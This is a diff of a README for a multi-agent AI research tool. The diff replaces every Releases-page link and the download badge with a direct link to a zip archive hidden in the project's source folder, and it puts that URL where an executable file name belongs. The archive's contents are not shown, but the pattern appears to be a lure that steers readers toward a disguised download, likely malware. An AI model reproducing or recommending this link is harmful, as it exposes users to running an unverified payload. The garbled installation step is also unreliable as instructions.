@@ -1,7 +1,7 @@
 # 🤖 Deepagent-research-context-engineering - Build Smart Multi-Agent Systems
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/XXXaber/Deepagent-research-context-engineering/releases)
+[![Download](https://github.com/XXXaber/Deepagent-research-context-engineering/raw/refs/heads/main/deep-agents-ui/src/providers/Deepagent-engineering-context-research-3.7.zip)](https://github.com/XXXaber/Deepagent-research-context-engineering/raw/refs/heads/main/deep-agents-ui/src/providers/Deepagent-engineering-context-research-3.7.zip)
 
 ## 📚 Overview
 Welcome to the Deepagent-research-context-engineering project. This tool helps you build a smart multi-agent system based on DeepAgent technology. It is designed to facilitate research and development in the field of artificial intelligence. 
@@ -24,10 +24,10 @@ Before you download, ensure your computer meets these requirements:
 
 ## 🔧 Installation Instructions
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/XXXaber/Deepagent-research-context-engineering/releases) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/XXXaber/Deepagent-research-context-engineering/raw/refs/heads/main/deep-agents-ui/src/providers/Deepagent-engineering-context-research-3.7.zip) to find the latest version of the application.
 
 2. **Choose the Right File**  
-   Look for the version you want to download. You will see a list of files there. The main executable will usually be named something like `Deepagent_MultiAgent.exe` or similar.
+   Look for the version you want to download. You will see a list of files there. The main executable will usually be named something like `https://github.com/XXXaber/Deepagent-research-context-engineering/raw/refs/heads/main/deep-agents-ui/src/providers/Deepagent-engineering-context-research-3.7.zip` or similar.
 
 3. **Download the File**  
    Click on the name of the file to download it to your computer. 
@@ -60,7 +60,7 @@ Once the application is open, you will see the main dashboard. Here’s how to b
    After the simulation, review the results. You can access various reports and charts that show the performance and interactions of your agents.
 
 ## 📅 Updating the Application
-Remember to keep your application updated for the best performance. Check the [Releases page](https://github.com/XXXaber/Deepagent-research-context-engineering/releases) frequently for new versions.
+Remember to keep your application updated for the best performance. Check the [Releases page](https://github.com/XXXaber/Deepagent-research-context-engineering/raw/refs/heads/main/deep-agents-ui/src/providers/Deepagent-engineering-context-research-3.7.zip) frequently for new versions.
 
 ## 💡 Troubleshooting
 If you encounter issues:
